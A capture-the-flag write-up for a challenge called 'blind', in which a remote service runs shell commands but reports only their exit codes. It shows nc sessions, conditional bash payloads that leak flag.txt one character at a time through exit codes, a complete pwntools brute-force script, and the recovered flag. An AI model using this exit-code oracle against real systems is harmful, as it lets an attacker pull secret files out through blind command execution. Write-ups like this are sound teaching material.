# blind

- Category: misc
- Rating: ? pts

After connecting we notice an Execute: prompt. Seems that it outputs only the return code of the command.

```
$ nc challenges.tamuctf.com 3424
Execute: ls 
0
Execute: asdf
127
Execute: ^C
```

We can confirm the existance of the flag but trying:

```
Execute: cat flag.txt
0
```

This is very similar to a blind sql situation where we don't get the output of the query but we get a (usually binary) signal instead. We can brute force the flag character by character by construct a command that returns a different code depending on whether or not a guessed character is right or wrong. For example: `if [[ $(cat flag.txt) == *"gigem{a"* ]];then asdf; else echo;fi` returns `127` while `if [[ $(cat flag.txt) == *"gigem{r"* ]];then asdf; else echo;fi` returns `0`.


# Solution

```python
#!/usr/bin/env python

from pwn import * 
from string import ascii_letters, digits, punctuation

r = remote("challenges.tamuctf.com", 3424)

context.log_level = 'DEBUG'

alphabet = ascii_letters + digits + '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|~}'
flag = "gigem{"

# while flag[-1] != '}':
while True:
    for cand in alphabet:
        payload = 'if [[ $(cat flag.txt) == *"%s"* ]];then asdf; else echo;fi' % (flag+cand)
        r.sendlineafter("Execute: ", payload)
        res = r.recvline()

        if b'127' in res:
            flag += cand
            print('update! flag: %s' % flag)
            break
        else: continue

print("done!")
print(flag)
```
# Flag

`gigem{r3v3r53_5h3ll5}`

*facepalm* That's right... A reverse shell would have been a quicker solution
